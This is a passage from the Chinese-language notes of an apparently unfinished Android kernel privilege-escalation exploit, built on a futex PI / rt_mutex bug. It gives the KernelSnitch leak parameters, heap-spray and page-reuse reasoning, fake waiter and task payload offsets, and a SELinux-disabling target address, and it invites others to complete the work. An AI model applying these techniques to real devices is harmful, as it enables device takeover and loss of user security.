  if ((order < MAX_ORDER-2) && pfn_valid_within(buddy_pfn)) {
      // 只有「order+1 的更高阶 buddy 也空闲（即将合并）」时才：
      list_add_tail(&page->lru, &zone->free_area[order].free_list[mt]);
      goto out;
  }
  list_add(&page->lru, &zone->free_area[order].free_list[mt]);  // ★ 默认：加队首
```

> **真相：默认是 `list_add`（队首，LIFO，优先复用）！**
> 只有「即将与更高阶 buddy 合并」这种特殊情况才 `list_add_tail`（故意推迟使用，等合并）。

**重大推论**：若 base 页顺利 discard 回 `free_area[3]` 且没被合并，
它应该在**队首**，**第 1 次 `sendmsg` 就该拿到**。
而实测发 **2008 次**（4016 块）仍 HWT（`trylock` 失败 = payload 未落页）
⇒ **base 页根本不在 `free_area[3]`**

⇒ **只剩两种可能：**
- **(a) 被合并进了更高阶（order ≥ 4）** → `sendmsg` 请求 order-3 看不到它
- **(b) 压根没 discard**（SLUB 三道门没过）

**连带推翻**：
- "覆盖量不足是主因" —— **从未成立**，覆盖量不是问题
- "2008 次满速能把 payload 送进 base 页附近" —— 错误
- "`free_area[3]` 约 3000~3400 块导致 base 页只占 0.03%" —— 无意义，队首就是队首

`MAX_ORDER = 11`，`pageblock_order` 通常 = 10 ⇒ `max_order = 11`
⇒ base 页（order 3）会尝试一直合并到 order 10（4 MB）⇒ 只要 buddy 链空闲，它就会离开 `free_area[3]`。

### 假设 H6：阻止合并

**H6**：让 base 页的 order-3 **buddy 不空闲**（被占用），阻止 `__free_one_page` 合并。

依据：
- `mm_struct` 896 B，order-3 页 32768 B ⇒ 每页 36 个对象
- `pre_ctx 35 + child_leak 1 = 36` = **正好一页** = base 页
- `post_ctx 36` = 另一页
- ⇒ 若 base 页与 `post_ctx` 页**物理相邻**，则清空 base 页时 `post_ctx` 页仍有对象
  ⇒ buddy 不空闲 ⇒ 不合并 ⇒ base 页留在 `free_area[3]` 队首 ⇒ 第 1 次 `sendmsg` 就拿到
- **这个几何配置从未被验证过。**

### 建议的下一步

**【P0，主线】区分「没 discard」还是「discard 但被合并」**
做法：只跑 ctx 分配 + `close` + `kill`（**不触发 PI walk**），在 discard 前后读 `/proc/meminfo` 的 `MemFree`。

| 判据 | 结论 |
|---|---|
| `ΔMemFree ≈ 0` | 没 discard ⇒ 查 SLUB 三道门（inuse / was_frozen / nr_partial） |
| `ΔMemFree > 0`（32 KB 整数倍） | discard 了 ⇒ 问题在**合并**或抢占 |

> **局限**：合并不改变 `MemFree`（页仍然是 free），
> 这个实验只能区分 "discard vs 没 discard"，**分不出"合并 vs 没合并"**。

**【P1】若 P0 证明 discard 了** ⇒ 攻合并（H6）
调整 `post_ctx` 数量与分配顺序，使 `mm_struct` slab 页物理连续，且 base 页邻居保持有对象。

**【P2】若 P0 证明没 discard** ⇒ 回 SLUB 三道门。

---

## 9. 泄漏专题（KernelSnitch）

### 原理（A 级）

```
clone(SIGCHLD, 无 CLONE_VM) → 子进程独立 mm_struct
父进程 open(/proc/PID/mem) 持引用
bruteforce 纯算术 hash 比对 → 泄漏 mm_struct 地址
```

`[B] kernelsnitch.h:204-218`
`bruteforce` **只做「纯算术 hash 比对」，全程不读候选地址**。
判据：`hash(addr_0, cand) == hash(addr_i, cand)`，`i = 1..collisions-1`
`[B] futex_hash.h:199  return hash & (futex_hashsize-1)`

### 当前可用参数（实测稳定）

```
BF_TOL=1                  # ★ 必需。collisions=5 ⇒ need=4
KSNITCH_COLLISIONS=5
MM_SZ=0x380               # mm_struct 步长（/sys/kernel/slab/mm_struct = :A-0000896）
GK39_DRAIN=0              # 实测 3 会拖慢，0 最稳
identity_start=0xffffffc000000000
identity_end=0xffffff8200000000
bf_cand_cnt ≈ 318865408
```

### 已修复的 bug（不要再当未解问题）

1. **thread7 `size_t` 回绕死循环**
   外层 `coarse_addr += COARSE_SZ` 在 `0xffffffffc0000000+1GiB` 处回绕到 `0x0`，
   `0x0 < SIZE_MAX` 恒真 ⇒ 从 0 重扫永不终止。三层循环全中。
2. **`range.end` 向上对齐溢出归零** ⇒ thread 7 的 33 GiB 区间从未被扫描
3. **网格过滤剔除真值**

### 泄漏失败的真因（按历史顺序，均已确认）

1. `futex_hashsize` 错（早期）
2. `collisions=5` 但用 `BF_TOL=0` ⇒ 真 mm 永远得 `hits=3`，过不了 `need=4`
3. `range.end` 溢出 + thread7 死循环
4. 环境 load 过高时碰撞集混入伪碰撞（偶发，**重启后首次跑最稳**）

> ★ 经验：重启后第一次跑往往能泄漏，越跑越差（fork 累积）。
> 异常时先 `killall -9 <bin>`。
> 判断进程泄漏必须用 `ps -A -o PID,NAME | awk '$2=="gK80"'` 精确匹配；
> 几百到一千之间振荡是**设计峰值**，不是 bug。

---

## 10. ❌ 已证伪路线（别再走一遍）

| 路线 | 为什么不行 |
|---|---|
| `STAMP_KEEP_LOCK`（保留真锁） | `waiter->lock` 本身悬空，结构性不可行（gK100 实证否决） |
| 扩 `pre_ctx` 到 107 | H1 已成立（8 个 mm_struct 同页），无意义 |
| 只改 `GK_PRE_CTX_AFTER_KILL=0` | base 页会在 fork churn 中被抢走 |
| `post-release` 900 次 fork 冲击 | slab 反而升 312 kB（gK98 否决） |
| `PIWALK_OWNER_NULL=1` | HWT 依旧 |
| 增大喷页量（59 MB 洪水） | base 页被淹没，**越大越差** |
| `prio` 改 200 | 第一轮 `top_waiter` 与 prio 无关 |
| "占满 `free_area[3]`" | `__GFP_NORETRY` 导致直接降级，结构性不可行 |
| 为 `sched_setattr` 路径预置 `pi_waiters` | 该路径 `orig_waiter=NULL ⇒ top_waiter=NULL`，整块检查被跳过 |
| **`WD_FL=1` 用户态探针直读 `fake_lock` 页** | `ARM64_PAN=y` ⇒ EL0 访问任何内核地址都 fault，**探针设计上不可能工作** |

### `WD_FL` 探针作废详情（重要方法论）

```c
// main.c:892-899（已删除的探针）
volatile uint64_t *fl = (void*)fake_lock;
*(uint32_t*)fake_lock;
```

探针在 **`watchdog_thread`（EL0 用户态线程）** 里执行。
`[B] ARM64_PAN = y` ⇒ PAN 使 EL0 访问**任何内核虚拟地址**都 fault，**与该页是否映射无关**。

`[A gK112]` `462.450 打印 wd_fl_addr 成功`，紧接着 `*(uint32_t*)fake_lock` 处
`Segmentation fault`，`exit=139`，`wd_fl_wl` 永不出现。
⇒ **这不能推出"页未映射"。**

⚠️ 附带后果：watchdog 是 pthread，它一崩整个进程即死，
⇒ 本轮 PI walk **根本没执行**（consumer 尚未启动），对主线**零信息**。

**结论**：**用户态无法用任何方式直接读内核内存来验证 payload 落页**（PAN）。
可行观测途径只有：
① 内核态触发的崩点/挂死形态（KE 地址 / HWT）
② ckpt 里用户态已知量（地址算术、errno、stamp 三项）
③ slab / free 统计（仅宏观，噪声大）
④ AEE `ZZ_INTERNAL` 明文崩点

---

## 11. 内核配置与权限边界（`/proc/config.gz` 实测）

| 类别 | 值 |
|---|---|
| 漏洞相关 | `FUTEX_PI=y` / `RT_MUTEXES=y` / `PREEMPT=y` / `SMP=y` |
| | `# DEBUG_RT_MUTEXES` / `DEBUG_LOCK_ALLOC` / `PROVE_LOCKING` **均 not set** |
| | ⇒ `rt_mutex_cond_detect_deadlock` 恒 false ⇒ `MIN_CHAINWALK` 下 `detect_deadlock=false` |
| 栈与内存 | `VMAP_STACK=y` / `THREAD_INFO_IN_TASK=y` / `ARM64_VA_BITS=39` / 无 `RANDOMIZE_KSTACK_OFFSET` |
| 利用面 ✗ | `SYSVIPC` / `POSIX_MQUEUE` / `CHECKPOINT_RESTORE` / `USER_NS` / `USERFAULTFD` / `PROC_KCORE` 全 not set |
| 利用面 ✓ | `KEYS=y`（SELinux 拒 shell）/ `ASHMEM=y` / `EPOLL=y` / `SHMEM=y` / `BPF_SYSCALL=y`（unpriv bpf EPERM） |
| 加固 | `RANDOMIZE_BASE=y`（实测 `slide=0`）/ `# SLAB_FREELIST_RANDOM` / `# SLAB_FREELIST_HARDENED` ← 对堆喷有利 |
| | `CC_STACKPROTECTOR_STRONG=y` / `ARM64_PAN=y` / `HARDENED_USERCOPY=y` / `KALLSYMS=y`（`# KALLSYMS_ALL` not set） |
| 权限 | `[A] uid=2000(shell)`，SELinux `Enforcing` `u:r:shell:s0` |
| | `/proc/kallsyms` / `dmesg` / `/sys/fs/pstore` / `/proc/last_kmsg` / `/data/tombstones` **全部 denied** |
| | `[A]` KernelSU v3.3.1 已装但 `/proc/modules` 无 `kernelsu` ⇒ 模块未加载，`su` 不可用（**空壳**） |

**提取内嵌 `.config` 方法**：`python3` 找 `b'IKCFG_ST'` / `b'IKCFG_ED'`，取中间字节 `gunzip`。
`vmlinux2.elf` 偏移 `17370224~17404890`，得 5628 行。

---

## 12. ★ `MIN_CHAINWALK` vs `FULL_CHAINWALK`（决定 PI walk 走多远）

```c
// rtmutex.c:362-372
rt_mutex_cond_detect_deadlock(orig_waiter, chwalk)
// DEBUG_RT_MUTEXES=n ⇒ 只依赖 chwalk == RT_MUTEX_FULL_CHAINWALK
```

| 入口 | chwalk | 结果 |
|---|---|---|
| `rtmutex.c:1761 task_blocks_on_rt_mutex(..., FULL_CHAINWALK)` ← **futex requeue 路径** | FULL | `detect_deadlock=true` ⇒ 能走到出 `EDEADLK`；`waiter != top_waiter` 不会提前退 |
| `rtmutex.c:1145 rt_mutex_adjust_prio_chain(task, MIN_CHAINWALK, NULL, next_lock, NULL, task)` ← **sched_setattr 路径** | MIN | **`orig_waiter = NULL ⇒ top_waiter = NULL`** |

```c
// rtmutex.c:455
struct rt_mutex_waiter *waiter, *top_waiter = orig_waiter;   // ⇒ top_waiter = NULL
// rtmutex.c:545-560
if (top_waiter) { ...task_has_pi_waiters / task_top_pi_waiter... }   // ← 整块被跳过
```

```
[B] 0x81348b8  cbz x27, 0x81348e8        ; x27=top_waiter，NULL ⇒ 跳过整块
    0x81348bc  ldr x8,[x19,#2152]        ; 2152=0x868 pi_waiters.rb_root
    0x81348c0  cbz x8, 0x8134ddc         ; 空 → out_unlock_pi
    0x81348c4  ldr x8,[x19,#2160]        ; 2160=0x870 = rb_leftmost（rb_root_cached 内）
    0x81348c8  sub x8,x8,#0x18           ; 换算成 waiter 指针
    0x81348cc  cmp x27,x8 / 0x81348e4 b.ne 0x8134ddc
    0x8134974  tbz w28,#0,0x8134a1c      ; w28=requeue，非0 ⇒ 继续
```

⇒ **`sched_setattr` 路径上不存在「`pi_top_task` 提前返回」检查。**
⇒ 预置 `fake_task->pi_waiters` / 调 `w1->prio` 对这条路径**完全无效**。

**这解释了历史上两个误判**：
(a) `FIRE_FROM_MAIN=1` 时 `cons_sched_ret=0` 不是「打通」，是「第一轮正常结束」
(b) 为 `sched_setattr` 路径预置 `pi_waiters` **完全无效**

---

## 13. 已验证的 payload 字段清单

| 位置 | 值 | 原因 |
|---|---|---|
| `w1+0x00` (`tree_entry.pc`) | **1** | 黑节点，避免 `__rb_insert` 旋转 |
| `w1+0x18` (`pi_tree.pc`) | **1** | 同上 |
| `w1+0x30` (`task`) | `fake_task` | `task_top_pi_waiter` 返回它 |
| `w1+0x38` (`lock`) | `fake_lock` | 通过 `BUG_ON(w->lock != lock)` |
| `w1+0x40` (`prio`) | **0** | 必须 `<= waiter->prio(20)`，否则抢 leftmost |
| `fake_task->pi_waiters.rb_node` | `w1` | 预置（**仅 requeue 路径**） |
| `fake_task->pi_waiters.rb_leftmost` | `w1` | 同上（**仅 requeue 路径**） |
| `fake_task->pi_top_task (0x878)` | `fake_task` | 提前返回条件（**仅 requeue 路径**） |
| `fake_task->normal_prio (0x8C)` | `120` | 同上 |
| `fake_task->prio (0x84)` | `120` | 同上 |
| `fake_task->usage (0x40)` | `0x100` | 防引用计数归零进 `__put_task_struct` |
| `fake_task->pi_blocked_on (0x880)` | `0` | 提前返回 |

`[A gK71]` 探针回读：
`pk_lock_leftmost = w1` ✓ / `pk_w1_pc = 1` ✓ / `pk_w1_pipc = 1` ✓ / `pk_w1_prio = 0` ✓ /
`pk_w1_lock = fake_lock` ✓ / `pk3_usage_40 = 0x100` ✓ / `pk3_usage_off = 0x40` ✓ /
`pk2_table_pitop = 0x878` ✓ / `pk2_table_nprio = 0x8C` ✓
⇒ **payload 内容构造本身是正确的，问题在"落页"。**

**其他关键约束**：
- `lock->waiters.rb_leftmost == 0` **不能跳过 `BUG_ON`**：
  `rt_mutex_top_waiter` 中 `w = rb_entry(rb_leftmost, ...)` ⇒ `rb_leftmost=0` 会读地址 `0x38` ⇒ 页错误
  ⇒ 伪锁的 `rb_leftmost` **必须**指向伪 waiter，且伪 `waiter+0x38 == 伪锁`
- 用 `empty_zero_page` 作伪锁**也不成立**：`lock+0x10 = 0` ⇒ 读 `0x38` 空指针崩
- **干净退出条件**（`rtmutex.c:652`）：`if (!rt_mutex_owner(lock)) { unlock; return 0; }`
  `owner = READ_ONCE(lock->owner) & ~RT_MUTEX_HAS_WAITERS`
  ⇒ 伪锁页 `+0x18` 写 0 或 1 ⇒ `rt_mutex_owner()==NULL` ⇒ PI walk 干净返回
- `[B] rt_mutex_dequeue`（`rtmutex.c:293-301`）有 `RB_EMPTY_NODE` 门：
  ```c
  if (RB_EMPTY_NODE(&waiter->tree_entry)) return;   // ★ 直接返回，不 erase
  rb_erase_cached(&waiter->tree_entry, &lock->waiters);
  ```
  悬空 waiter 处于 `RB_CLEAR_NODE` ⇒ **必须靠 stamp 覆盖 `waiter+0x00` 与 `waiter+0x38`**，
  写原语才可能触发。

**gK70 的 `tree_entry` / `pi_tree_entry` 混用**：
若同一个 `w1` 同时当 lock 树根和 pi 树根，`rt_mutex_dequeue_pi` 会拿 `w1+0x00`（tree_entry）
去删 pi 树（节点是 `w1+0x18`）⇒ 摧毁 `w1` 锚点 ⇒ `__rb_erase_color` 沿无效 parent 链游走 ⇒ 死循环 ⇒ HWT（晚约 70s）。
★ **同一个 `w1` 不能同时当两棵树的根。**

---

## 14. 历史样本定性（含曾误判的）

| 样本 | 日期 | 真相 |
|---|---|---|
| **gK81** | 10-23 | `GK39_DRAIN=3` ⇒ KE 消失变挂死。**只能说明"页可读"**（挂死在 trylock 自旋而非页错误），**不是写原语成功** |
| **gK92 run9** | 10-25 | md5 `634a144f4b58b814b0dfa98345db362d`，size 951624。配置 `DIAG=8 PIWALK_OWNER_NULL=1 PRE_CTX_DEFER=1 A45_DEFER=0 GK38_SENDS=251 GK38_SOCKETS=8`。`stamp_off=128 / optlen=264 / errno=99` 全生效，`bf_tol_hits=1 / best_hits=4`。崩 `rb_erase_cached+0x30`。**不是"成功样本"** —— 只证明「stamp 三字段生效 + 进入双子树 erase」，**不证明 payload 落页、不证明写原语达成** |
| **gK58** | 10-22 | 崩 `adjust_prio_chain+0x14c` ⇒ **base 可读 ⇒ 真值**。且**0x80 偏移首次实测验证**（唯一变量 `STAMP_WAITER_OFF 0x70 → 0x80`） |
| **gK60 / gK66 / gK71** | | 崩 `trylock+0x1c` ⇒ base 不可读 ⇒ **假阳性** |
| **gK108** | 10-26 | md5 `1f52c2da6fd5c9523aa3699942dabefc`，size 951792。**基线**（`0x02080B28` 旧写目标） |
| **gK109** | 10-27 | md5 `40bb48ded4b88a71f396207f373db5a9`，size 951792。P3 修正（`0x02080B08`）。崩 `trylock+0x1c`，`getenforce` 仍 `Enforcing`。**⚠ 本次非单变量**（裸跑，与 gK108 差 5 个参数）⇒ 结果**不能**归因于 P3 |
| **gK112** | 10-27 | `WD_FL` 探针 → SIGSEGV（PAN），**对主线零信息** |
| **gK110** | 10-27 | 崩 `rt_mutex_adjust_prio_chain+0x14c` —— **历史首次非 trylock 崩点** |
| **gK111** | 10-27 | run1 / run2 均 HWT（`bootreason=Watchdog`），两次 HWT 判定**确定性** |

**`gK58` 的唯一一次完整寄存器现场**（A 级，可用于校准反汇编）：

```
pc : _raw_spin_trylock+0x1c/0x70
lr : rt_mutex_adjust_prio_chain+0x104/0x68c
x19 = task_struct    x26 = task+0x85c (&pi_lock)
x25 = task->pi_blocked_on（内核栈地址）
x24 = 0 = next_lock ★根因
x22 = 0 = orig_lock    x21 = 0 = orig_waiter    x23 = 0 = chwalk
x0 = 0（崩溃地址）    x1 = 0x400
Kernel Offset = 0x1895e00000 (→ _text = 0xffffff989de00000)
PHYS_OFFSET = 0xffffffe880000000
```

---

## 15. 铁律与最贵的教训

### 铁律（优先级高于一切）

1. **所有数据必须有证据，禁止猜**
2. **崩溃必须多因归因**（≥3 条其他可能 + 区分手段）
3. **办事精简效率**，前提是能做好：能静态确认的不上机
4. 任何结论必须有**明确证伪条件**。上机前先写**判据表**
5. 上机前先**摸透原理**，不连续盲试
6. 已确立结论若因发现错误而变动，**必须记录变动原因**
7. 重要结论**立即写 MemoryBank**
8. 改代码之前先确定参数可用
9. 上机前校验 `nonzero + md5 + magic`
10. 上机前 `diff` 参数回显
11. **崩点只能推中间状态，不能代替最终判据。成败只看 `getenforce`**

### 十三个最贵的教训

1. 自洽性检验**只能排除矛盾，不能证明前提正确**
2. 反汇编**只读一条指令就下结论 = 必错**
3. 交接文档的结论**必须回源码重验**
4. 从源码抄来的机制**必须确认这条路径真的执行它**
5. **自我推翻也要有证据**
6. "stamp 生效" ≠ "字段写对" ≠ "写原语达成"，**三个层次分开验**
7. ★ **不要凭印象复述源码。** 把 `list_add` 记成 `list_add_tail`，
   导致后面 10 多轮实验方向全错。凡是"源码说……"**必须当场 grep 原文**
8. ★ **不要凭符号名猜语义。** `selinux_enforcing` 看起来像开关，实际是 init-only 的 boot 变量；
   真开关是 `struct selinux_state.enforcing`（bool，+1）。必须看反汇编看谁在写、写在哪个偏移
9. ★★ **不要只信一张符号表。** `syms7.txt` 里三条名字与地址错位一格，
   靠反汇编三重自洽才纠正
10. ★★ **上机必须显式固定全套环境变量并回显。** 裸跑导致两次实验差 5 个参数，
    结果完全不可归因
11. ★ **判据幅度必须大于噪声。** 32 KB 信号埋在 14.46 MB slab 噪声里 ⇒ 判据失效
12. ★ **探针不能用待验证的偏移表自身读数自证**
13. ★ **PAN 让"用户态直读内核内存"整类想法不可行** ⇒ 不要浪费轮次

---

## 16. 环境事故记录

### 崩溃导致源码变全 NUL

`[A]` `gK57` 那次设备重启导致 `/root/gk3build/GhostLock-main/src/core/util.c`
变成**全 NUL（46245 字节全 0）**（已从 `.bak_gk41b` 恢复，1163 行，NUL 检测通过）。

★ **教训：设备崩溃后必须做全源码 NUL 检测，不能假设文件完好**

```bash
find . -name '*.c' -o -name '*.h' | xargs -I{} sh -c \
  'tr -d "\0" < {} | head -c1 | grep -q . || echo NUL:{}'
```

### 环境健康判据

- HyperOS 系统线程多、load 高属**正常现象**，不要当成内存污染
- 判断内存是否干净要看 `MemAvailable`，而不是 `top` 的 `free` 列

---

## 17. 上机前必做清单 / 上机后标准动作

### 上机前

1. `md5` 设备端 == 主机端
2. `nonzero` 字节数 > 0（曾遇到过二进制被清零）
3. `magic = 7f 45 4c 46`
4. `diff` 参数回显 vs 上一轮
5. ★★ **必须显式传全套环境变量并用 ckpt 回显确认**（裸跑违反此条，结果不可归因）
6. 确认无残留进程

### 上机后

1. **先查 `getenforce`**（唯一硬判据）
2. 查 `bootreason`（区分 panic vs Watchdog）+ `uptime` 连续递增（排除陈旧值）
3. 查 AEE 新目录：`ls -lt /data/vendor/aee_exp/` 看 `db.fatal.NN.KE` / `.HWT`
4. 从 `ZZ_INTERNAL` 取崩点明文
5. 从 `db_history` 末尾取时间线
6. 读 ckpt 日志取参数与判据回显

※ `db.fatal.NN.*.dbg` 已加密，**不要指望从中取寄存器或 fault address**

---

## 18. 文件清单

| 文件 | 说明 |
|---|---|
| `src/core/ares/offsets.h` | ★ 本机偏移表（`off_selinux_enforcing = 0x02080B08`，带完整推导注释） |
| `src/core/target.h` | 目标地址常量 |
| `src/core/main.c` | 主利用逻辑（`main.c:445` = `pc_v = P & ~3UL`，颜色位已正确） |
| `src/core/util.c` | sendmsg 喷页、地址换算、ckpt 打点 |
| `artifacts/bin/gK108` | 基线二进制（`1f52c2da`） |
| `artifacts/bin/gK109` | P3 修正二进制（`40bb48de`） |
| `artifacts/profile/assets_ares.conf` | GhostLock App 的 ares profile |
| `reference/syms/syms7.txt` | 57019 行符号表（⚠ 名字↔地址配对不可靠） |
| `logs/ckpt/` | 60+ 次实跑打点日志 |
| `logs/aee/` | AEE 取证明文 |

---

**最后一句**：本仓库是一个**未完成**的适配实验，卡在最后一步（payload 落页）。
它记录了**哪些路走不通**以及与**为什么** —— 这部分可能比代码本身更有价值。
如果你能推它过线，欢迎开 issue / PR。
